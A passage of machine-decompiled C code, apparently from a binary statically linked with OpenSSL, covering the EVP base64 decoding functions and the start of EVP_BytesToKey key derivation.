    *(int32_t *)a1 = 0;
    *(int32_t *)(v1 + 88) = 0;
    *(int32_t *)(v1 + 92) = 0;
    int64_t result; // 0x4abff0
    return result;
}

// Address range: 0x4ac010 - 0x4ac1a7
// Used cryptographic patterns:
//  - ASCII_to_BIN_table (8-bit, little endian)
int64_t EVP_DecodeBlock(int64_t a1, int64_t a2, int32_t a3, int64_t a4, int64_t a5, int64_t a6) {
    int64_t v1 = a3;
    char v2 = *(char *)(a2 % 128 + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac01f
    int64_t v3 = a2; // 0x4ac024
    int64_t v4 = v1; // 0x4ac024
    if (v2 == -32) {
        // 0x4ac026
        v3 = a2;
        v4 = v1;
        if (a3 >= 0 == (a3 != 0)) {
            int64_t v5 = v1 + 0xffffffff; // 0x4ac03d
            int64_t v6 = v5 & 0xffffffff; // 0x4ac03d
            int64_t v7 = a2 + 1; // 0x4ac040
            int32_t v8 = v5; // 0x4ac044
            v3 = v7;
            v4 = v6;
            while (v8 >= 0 == (v8 != 0)) {
                unsigned char v9 = *(char *)v7; // 0x4ac030
                char v10 = *(char *)((int64_t)(v9 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac036
                v3 = v7;
                v4 = v6;
                if (v10 != -32) {
                    // break -> 0x4ac048
                    break;
                }
                v5 = v6 + 0xffffffff;
                v6 = v5 & 0xffffffff;
                v7++;
                v8 = v5;
                v3 = v7;
                v4 = v6;
            }
        }
    }
    int64_t v11 = v4; // 0x4ac04b
    if ((int32_t)v4 >= 4) {
        int64_t v12 = 0x100000000 * v4 / 0x100000000 + v3;
        unsigned char v13 = *(char *)(v12 - 1); // 0x4ac050
        char v14 = *(char *)((int64_t)(v13 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac058
        v11 = v4;
        if ((v14 || 19) == -13) {
            int64_t v15 = v12 - 2; // 0x4ac069
            int64_t v16 = v4 + 0xffffffff; // 0x4ac086
            while ((int32_t)v16 != 3) {
                int64_t v17 = v16 & 0xffffffff; // 0x4ac086
                unsigned char v18 = *(char *)v15; // 0x4ac070
                char v19 = *(char *)((int64_t)(v18 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac07a
                v15--;
                v11 = v17;
                if ((v19 || 19) != -13) {
                    goto lab_0x4ac0a0;
                }
                v16 = v17 + 0xffffffff;
            }
            // 0x4ac093
            return 0xffffffff;
        }
    }
  lab_0x4ac0a0:
    // 0x4ac0a0
    if (v11 % 4 != 0) {
        // 0x4ac093
        return 0xffffffff;
    }
    // 0x4ac0a5
    if ((int32_t)v11 < 1) {
        // 0x4ac093
        return 0;
    }
    unsigned char v20 = *(char *)v3; // 0x4ac0ad
    char v21 = *(char *)((int64_t)(v20 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac0b3
    unsigned char v22 = *(char *)(v3 + 1); // 0x4ac0b8
    char v23 = *(char *)((int64_t)(v22 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac0bf
    if ((v23 || v21) < 0) {
        // 0x4ac093
        return 0xffffffff;
    }
    unsigned char v24 = *(char *)(v3 + 3);
    char v25 = *(char *)((int64_t)(v24 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff");
    unsigned char v26 = *(char *)(v3 + 2);
    char v27 = *(char *)((int64_t)(v26 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff");
    int64_t v28 = 0; // 0x4ac195
    int64_t v29 = a1; // 0x4ac195
    if ((v27 || v25) < 0) {
        // 0x4ac093
        return 0xffffffff;
    }
    int64_t v30 = 0x1000 * (int64_t)v23;
    int64_t v31 = 64 * (int64_t)v27;
    int64_t v32 = 3; // 0x4ac113
    *(char *)(v29 + 2) = v25 | (char)v31;
    *(char *)v29 = (char)((0x40000 * (int64_t)v21 | v30) / 0x10000);
    int64_t v33 = v28 + 4; // 0x4ac12b
    *(char *)(v29 + 1) = (char)((v31 | v30) / 256);
    int64_t result = v32; // 0x4ac138
    while (v11 > (v33 & 0xfffffffc)) {
        int64_t v34 = v28 + v3;
        unsigned char v35 = *(char *)(v34 + 5); // 0x4ac13e
        unsigned char v36 = *(char *)(v34 + 4); // 0x4ac144
        char v37 = *(char *)((int64_t)(v35 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac150
        char v38 = *(char *)((int64_t)(v36 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac15b
        result = 0xffffffff;
        if ((v38 || v37) < 0) {
            // break -> 0x4ac093
            break;
        }
        unsigned char v39 = *(char *)(v34 + 7);
        char v40 = *(char *)((int64_t)(v39 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff");
        unsigned char v41 = *(char *)(v34 + 6);
        char v42 = *(char *)((int64_t)(v41 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff");
        result = 0xffffffff;
        v28 = v33;
        v29 += 3;
        if ((v42 || v40) < 0) {
            // break -> 0x4ac093
            break;
        }
        v30 = 0x1000 * (int64_t)v37;
        v31 = 64 * (int64_t)v42;
        v32 = v32 + 3 & 0xffffffff;
        *(char *)(v29 + 2) = v40 | (char)v31;
        *(char *)v29 = (char)((0x40000 * (int64_t)v38 | v30) / 0x10000);
        v33 = v28 + 4;
        *(char *)(v29 + 1) = (char)((v31 | v30) / 256);
        result = v32;
    }
    // 0x4ac093
    return result;
}

// Address range: 0x4ac1b0 - 0x4ac20f
int64_t EVP_DecodeFinal(int64_t * a1, int64_t a2, int64_t * a3) {
    // 0x4ac1b0
    *(int32_t *)a3 = 0;
    int64_t v1; // 0x4ac1b0
    int32_t v2 = v1;
    if (v2 == 0) {
        // 0x4ac1d8
        return 1;
    }
    // 0x4ac1f0
    int64_t v3; // 0x4ac1b0
    int64_t v4; // 0x4ac1b0
    int64_t v5; // 0x4ac1b0
    uint32_t v6 = (int32_t)EVP_DecodeBlock(a2, (int64_t)a1 + 8, v2, v5, v4, v3); // 0x4ac200
    int64_t result = 0xffffffff; // 0x4ac202
    if (v6 >= 0) {
        // 0x4ac204
        *(int32_t *)a1 = 0;
        *(int32_t *)a3 = v6;
        result = 1;
    }
    // 0x4ac1d8
    return result;
}

// Address range: 0x4ac210 - 0x4ac592
// Used cryptographic patterns:
//  - ASCII_to_BIN_table (8-bit, little endian)
int64_t EVP_DecodeUpdate(int64_t * a1, int64_t a2, int32_t * a3, int64_t a4, uint32_t a5, int64_t a6, int64_t a7, int64_t a8, int64_t a9, int64_t a10, int64_t a11, int64_t a12) {
    int64_t v1 = (int64_t)a1;
    int64_t v2; // 0x4ac210
    int64_t v3 = v2 & 0xffffffff; // 0x4ac22e
    int32_t * v4 = (int32_t *)(v1 + 88); // 0x4ac240
    uint32_t v5 = *v4; // 0x4ac240
    int64_t v6 = v5; // 0x4ac240
    int32_t * v7 = (int32_t *)(v1 + 92); // 0x4ac244
    int64_t v8 = (int64_t)*v7; // 0x4ac244
    int32_t v9 = 0; // 0x4ac248
    int64_t result = 0; // 0x4ac248
    int64_t v10 = v6; // 0x4ac248
    int64_t v11 = v8; // 0x4ac248
    int64_t v12 = v3; // 0x4ac248
    if (a5 == 0) {
        goto lab_0x4ac50a_7;
    } else {
        if ((int32_t)v2 == 0) {
            // 0x4ac4e0
            uint64_t v13; // 0x4ac210
            char v14 = *(char *)(v13 % 128 + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff"); // 0x4ac4ed
            v9 = 0;
            result = 0;
            v10 = v6;
            v11 = v8;
            v12 = 0;
            if (v14 != -14) {
                goto lab_0x4ac257;
            } else {
                goto lab_0x4ac50a_7;
            }
        } else {
            goto lab_0x4ac257;
        }
    }
  lab_0x4ac428:;
    // 0x4ac428
    int64_t v15; // 0x4ac210
    int64_t v16 = v15;
    int64_t v17; // 0x4ac210
    int64_t v18 = v17 % 4; // 0x4ac42b
    int64_t v19 = v16; // 0x4ac431
    int64_t v20; // 0x4ac210
    int64_t v21; // 0x4ac210
    int64_t v22; // 0x4ac210
    int64_t v23; // 0x4ac210
    if (v18 != 0 == (int32_t)v21 == 0) {
        goto lab_0x4ac2d0;
    } else {
        int64_t v24 = 0x100000000 * v17 / 0x100000000 + v1;
        char v25 = *(char *)(v24 + 6); // 0x4ac44a
        v23 = v18;
        v22 = (int64_t)(v25 == 61) + (int64_t)(*(char *)(v24 + 7) == 61);
        v20 = v16;
        goto lab_0x4ac458;
    }
  lab_0x4ac2d0:;
    int64_t v26 = v19;
    int64_t v27; // 0x4ac398
    int64_t v28 = v27; // 0x4ac2d5
    int64_t v29 = v21; // 0x4ac2d5
    int64_t v30 = v26; // 0x4ac2d5
    unsigned char v31; // 0x4ac398
    if (v31 == -14) {
        // 0x4ac4d0
        v23 = v17 % 4;
        v22 = v21;
        v20 = v26;
        goto lab_0x4ac458;
    } else {
        goto lab_0x4ac2db;
    }
  lab_0x4ac369:;
    // 0x4ac369
    int64_t v32; // 0x4ac210
    int64_t v33 = v32; // 0x4ac36c
    int32_t v34; // 0x4ac210
    int32_t v35 = v34; // 0x4ac36c
    int64_t v36; // 0x4ac210
    int64_t v37 = v36; // 0x4ac36c
    int64_t v38; // 0x4ac210
    int64_t v39 = v38; // 0x4ac36c
    int64_t v40; // 0x4ac210
    int64_t v41 = v40; // 0x4ac36c
    int64_t v42; // 0x4ac210
    int64_t v43 = v42; // 0x4ac36c
    int64_t v44; // 0x4ac210
    int64_t v45 = v44; // 0x4ac36c
    int64_t v46; // 0x4ac210
    int64_t v47 = v46; // 0x4ac36c
    v9 = v34;
    result = 1;
    v10 = v42;
    v11 = v44;
    v12 = v46;
    uint64_t v48; // 0x4ac210
    if (v38 <= v48) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    goto lab_0x4ac372;
  lab_0x4ac41c:
    // 0x4ac41c
    v28 = v27;
    v29 = v21;
    v30 = 0;
    v15 = 0;
    int64_t v63; // 0x4ac210
    if ((int32_t)v63 != (int32_t)v48) {
        goto lab_0x4ac2db;
    } else {
        goto lab_0x4ac428;
    }
  lab_0x4ac2db:;
    int32_t v100 = v17;
    int32_t v77; // 0x4ac210
    int32_t v81; // 0x4ac210
    int64_t v79; // 0x4ac210
    int64_t v83; // 0x4ac210
    int64_t v84; // 0x4ac210
    int64_t v82; // 0x4ac210
    int64_t v78; // 0x4ac210
    if (v100 < 64) {
        goto lab_0x4ac369;
    } else {
        // 0x4ac2e8
        v81 = v100;
        v82 = v29;
        v83 = v30;
        v84 = 1;
        v77 = v100;
        v78 = v29;
        v79 = v30;
        if (v28 == 242) {
            goto lab_0x4ac4b0;
        } else {
            goto lab_0x4ac2f6;
        }
    }
  lab_0x4ac372:;
    int64_t v49 = v33; // 0x4ac37a
    int32_t v50 = v35; // 0x4ac37a
    int64_t v51; // 0x4ac210
    v51++;
    int64_t v52 = v37; // 0x4ac37a
    int64_t v53 = v39; // 0x4ac37a
    int64_t v54 = v41; // 0x4ac37a
    int64_t v55 = v43; // 0x4ac37a
    int64_t v56 = v48 + 1 & 0xffffffff; // 0x4ac37a
    int64_t v57 = v45; // 0x4ac37a
    int64_t v58 = v47; // 0x4ac37a
    v9 = v35;
    result = 0xffffffff;
    v10 = v43;
    v11 = v45;
    v12 = v47;
    if ((int32_t)v43 > 79) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    goto lab_0x4ac380;
  lab_0x4ac458:;
    int64_t v75 = v20;
    int64_t v76 = v22;
    v28 = 242;
    v29 = v76;
    v30 = v75;
    if (v23 == 0) {
        // 0x4ac458
        v77 = v17;
        v78 = v76;
        v79 = v75;
        goto lab_0x4ac4b0;
    } else {
        goto lab_0x4ac2db;
    }
  lab_0x4ac4b0:;
    int32_t v80 = v77;
    v81 = v80;
    v82 = v78;
    v83 = v79;
    v84 = 0;
    int32_t v65; // 0x4ac210
    int32_t v85 = v65; // 0x4ac4b3
    int64_t v86 = 0; // 0x4ac4b3
    char v87 = 1; // 0x4ac4b3
    int64_t v88 = 1; // 0x4ac4b3
    int64_t v89 = v63; // 0x4ac4b3
    int64_t v74; // 0x4ac210
    int64_t v90 = v74; // 0x4ac4b3
    int64_t v91 = v79; // 0x4ac4b3
    int64_t v92 = 0; // 0x4ac4b3
    int64_t v93 = v17; // 0x4ac4b3
    if (v80 >= 0 == (v80 != 0)) {
        goto lab_0x4ac2f6;
    } else {
        goto lab_0x4ac34d;
    }
  lab_0x4ac2f6:;
    // 0x4ac2f6
    unsigned char v67; // 0x4ac380
    int64_t v94 = v67; // 0x4ac380
    int64_t v66; // 0x4ac210
    int64_t v70; // 0x4ac212
    int64_t v95 = EVP_DecodeBlock(v66, v70, v81, v94, v94, v82); // 0x4ac312
    int32_t v96 = v95; // 0x4ac317
    v9 = v65;
    result = 0;
    v10 = v83;
    v11 = v84;
    v12 = 0;
    if (v96 < 0) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    int64_t v97 = v82 & 0xffffffff; // 0x4ac319
    v9 = v65;
    result = 0xffffffff;
    v10 = v83;
    v11 = v84;
    v12 = 0;
    if (v95 < v97) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    int32_t v98 = v82; // 0x4ac33b
    v85 = v65 - v98 + v96;
    v86 = v95;
    v87 = v98 != 0;
    v88 = v97;
    v89 = v63 & 0xffffffff;
    v90 = v74 & 0xffffffff;
    v91 = v83;
    v92 = v84;
    v93 = 0;
    goto lab_0x4ac34d;
  lab_0x4ac34d:
    // 0x4ac34d
    v9 = v85;
    result = 0;
    v10 = v91;
    v11 = v92;
    v12 = v93;
    int32_t * v99; // 0x4ac210
    if (!((v87 == 0 | v86 >= (int64_t)*v99))) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    // 0x4ac356
    *v99 = (int32_t)v86;
    v9 = v85;
    result = 0;
    v10 = v91;
    v11 = v92;
    v12 = v93;
    if ((int32_t)v90 >= 0) {
        // break -> 0x4ac50a
        goto lab_0x4ac50a_7;
    }
    // 0x4ac362
    v32 = 0x100000000 * v86 / 0x100000000 + v66;
    v34 = v85;
    v36 = v88;
    v38 = v89;
    v40 = v90;
    v42 = v91;
    v44 = v92;
    v46 = v93;
    goto lab_0x4ac369;
  lab_0x4ac50a_7:
    // 0x4ac50a
    *a3 = v9;
    *(int32_t *)a1 = (int32_t)v12;
    *v4 = (int32_t)v10;
    *v7 = (int32_t)v11;
    return result;
  lab_0x4ac257:
    // 0x4ac257
    v9 = 0;
    result = 1;
    v10 = v6;
    v11 = v8;
    v12 = v3;
    if (a5 >= 1) {
        // 0x4ac260
        v9 = 0;
        result = 0xffffffff;
        v10 = v6;
        v11 = v8;
        v12 = v3;
        if (v5 <= 79) {
            // 0x4ac380
            v70 = v1 + 8;
            v99 = (int32_t *)(v1 + 4);
            v49 = a2;
            v50 = 0;
            v51 = a4;
            v52 = 0;
            v53 = a5;
            v54 = 0xffffffff;
            v55 = v6;
            v56 = 1;
            v57 = v8;
            v58 = v3;
            while (true) {
              lab_0x4ac380:;
                int64_t v59 = v58;
                int64_t v60 = v57;
                v48 = v56;
                int64_t v61 = v55;
                int64_t v62 = v54;
                v63 = v53;
                int64_t v64 = v52;
                v65 = v50;
                v66 = v49;
                v67 = *(char *)v51;
                v31 = *(char *)((int64_t)(v67 % 128) + (int64_t)"\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xf0\xff\xff\xf1\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff\xe0\xff\xff\xff\xff\xff\xff\xff\xff\xff\xff>\xff\xf2\xff?456789:;<=\xff\xff\xff\x00\xff\xff\xff\x00\x01\x02\x03\x04\x05\x06\a\b\t\n\v\f\r\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\xff\xff\xff\xff\xff\xff\x1a\x1b\x1c\x1d\x1e\x1f !\"#$%&'()*+,-./0123\xff\xff\xff\xff\xff");
                int64_t v68; // 0x4ac210
                int64_t v69; // 0x4ac210
                if ((v31 || 19) == -13) {
                    // 0x4ac530
                    v68 = v61;
                    v69 = v59;
                    v9 = v65;
                    result = 0xffffffff;
                    v10 = v61;
                    v11 = v60;
                    v12 = v59;
                    if (v31 == -1) {
                        // break -> 0x4ac50a
                        break;
                    }
                } else {
                    if ((int32_t)v59 >= 80) {
                        // 0x4ac3b7
                        OpenSSLDie("encode.c", 268, "n < (int)sizeof(ctx->enc_data)");
                        // UNREACHABLE
                    }
                    // 0x4ac298
                    *(char *)(0x100000000 * v59 / 0x100000000 + v70) = v67;
                    v68 = v61 + 1 & 0xffffffff;
                    v69 = v59 + 1 & 0xffffffff;
                }
                // 0x4ac2a8
                v17 = v69;
                int64_t v71 = v68;
                int64_t v72 = v64; // 0x4ac2ab
                int64_t v73 = v62; // 0x4ac2ab
                if (v67 == 61) {
                    // 0x4ac470
                    v72 = v64 + 1 & 0xffffffff;
                    v73 = ((int32_t)v62 == -1 ? v17 : v62) & 0xffffffff;
                }
                // 0x4ac2b1
                v27 = v31;
                v74 = v73;
                v21 = v72;
                switch (v31) {
                    case -15: {
                        // 0x4ac410
                        v32 = v66;
                        v34 = v65;
                        v36 = v21;
                        v38 = v63;
                        v40 = v74;
                        v42 = 0;
                        v44 = v60;
                        v46 = v17;
                        if ((int32_t)v60 != 0) {
                            goto lab_0x4ac369;
                        } else {
                            goto lab_0x4ac41c;
                        }
                    }
                    case -16: {
                        if ((int32_t)v60 == 0) {
                            goto lab_0x4ac41c;
                        } else {
                            // 0x4ac48d
                            v33 = v66;
                            v35 = v65;
                            v37 = v21;
                            v39 = v63;
                            v41 = v74;
                            v43 = 0;
                            v45 = 0;
                            v47 = v17;
                            if (v63 <= v48) {
                                // break -> 0x4ac50a
                                break;
                            }
                            goto lab_0x4ac372;
                        }
                    }
                    default: {
                        // 0x4ac2c7
                        v19 = v71;
                        v15 = v71;
                        if ((int32_t)v63 == (int32_t)v48) {
                            goto lab_0x4ac428;
                        } else {
                            goto lab_0x4ac2d0;
                        }
                    }
                }
            }
        }
    }
    goto lab_0x4ac50a_7;
}

// Address range: 0x4ac790 - 0x4ac7a5
int64_t EVP_get_pw_prompt(void) {
    // 0x4ac790
    return *(char *)&g287 != 0 ? (int64_t)&g287 : 0;
}

// Address range: 0x4ac7b0 - 0x4acad0
int64_t EVP_BytesToKey(int64_t a1, int64_t a2, int64_t a3, int64_t * a4, int32_t a5, int64_t a6, int64_t * a7, int64_t a8) {
    int32_t v1 = 0; // bp-140, 0x4ac7df
    int32_t * v2 = (int32_t *)(a1 + 8); // 0x4ac7f6
    int32_t v3 = *v2; // 0x4ac7f6
    int64_t v4 = __readfsqword(40); // 0x4ac7fe
    if (v3 > 64) {
        // 0x4ac9b8
        OpenSSLDie("evp_key.c", 126, "nkey <= EVP_MAX_KEY_LENGTH");
        // UNREACHABLE
    }
    int32_t v5 = *(int32_t *)(a1 + 12); // 0x4ac811
    if (v5 > 16) {
        // 0x4ac998
        OpenSSLDie("evp_key.c", 127, "niv <= EVP_MAX_IV_LENGTH");
        // UNREACHABLE
    }
    int32_t result = v3; // 0x4ac836
    int64_t v6; // 0x4ac7b0
    int64_t v7; // 0x4ac7b0
    int64_t v8; // 0x4ac7b0
    int64_t v9; // bp-200, 0x4ac7b0
    int64_t v10; // 0x4ac7b0
    int64_t v11; // 0x4ac7b0
    int64_t v12; // 0x4ac7b0
    int64_t v13; // 0x4ac7b0
    int64_t v14; // 0x4ac7b0
    int64_t v15; // 0x4ac7b0
    int32_t v16; // 0x4ac7b0
    int32_t v17; // 0x4ac7b0
    int32_t v18; // 0x4ac7b0
    int32_t v19; // 0x4ac7b0
    int32_t v20; // 0x4ac7b0
    int32_t v21; // 0x4ac7b0
    int32_t v22; // 0x4ac7b0
    int32_t v23; // 0x4ac7b0
    int64_t v24; // 0x4ac7b0
    int64_t v25; // 0x4ac7b0
    if (a4 == NULL) {
        goto lab_0x4ac946;
    } else {
        // 0x4ac83c
        v24 = a5;
        int64_t v26 = (int64_t)a4;
        EVP_MD_CTX_init((int64_t)&v9);
        int64_t v27 = EVP_DigestInit_ex(&v9, a2, 0, v26, v24); // 0x4ac86e
        result = 0;
        if ((int32_t)v27 == 0) {
            goto lab_0x4ac946;
        } else {
            // 0x4ac87b
            int64_t v28; // bp-136, 0x4ac7b0
            v25 = &v28;
            uint32_t v29 = (int32_t)a6;
            v7 = v26;
            v16 = 0;
            v17 = v5;
            v20 = v3;
            v13 = (int64_t)a7;
            v10 = a8;
            while (true) {
              lab_0x4ac87b:
                // 0x4ac87b
                v11 = v10;
                int64_t v30 = v13;
                uint32_t v31 = v20;
                v18 = v17;
                int64_t v32 = v7;
                if (v16 != 0) {
                    int64_t v33 = EVP_DigestUpdate(&v9, v25, (int64_t)v1); // 0x4ac982
                    v23 = 0;
                    if ((int32_t)v33 == 0) {
                        // break -> 0x4ac92d
                        break;
                    }
                }
                int64_t v34 = EVP_DigestUpdate(&v9, v26, v24); // 0x4ac894
                v23 = 0;
                if ((int32_t)v34 == 0) {
                    // break -> 0x4ac92d
                    break;
                }
                if (a3 != 0) {
                    int64_t v35 = EVP_DigestUpdate(&v9, a3, 8); // 0x4ac8b6
                    v23 = 0;
                    if ((int32_t)v35 == 0) {
                        // break -> 0x4ac92d
                        break;
                    }
                }
                int64_t v36 = EVP_DigestFinal_ex(&v9, &v28, (int64_t *)&v1); // 0x4ac8c8
                v23 = 0;
                if ((int32_t)v36 == 0) {
                    // break -> 0x4ac92d
                    break;
                }
                // 0x4ac8d1
                if (v29 >= 2) {
                    int64_t v37 = EVP_DigestInit_ex(&v9, a2, 0, v32, v24); // 0x4ac922
                    v23 = 0;
                    if ((int32_t)v37 == 0) {
                        // break (via goto) -> 0x4ac92d
                        goto lab_0x4ac92d_3;
                    }
                    int64_t v38 = EVP_DigestUpdate(&v9, v25, (int64_t)v1); // 0x4ac8f2
                    v23 = 0;
                    if ((int32_t)v38 == 0) {
                        // break (via goto) -> 0x4ac92d
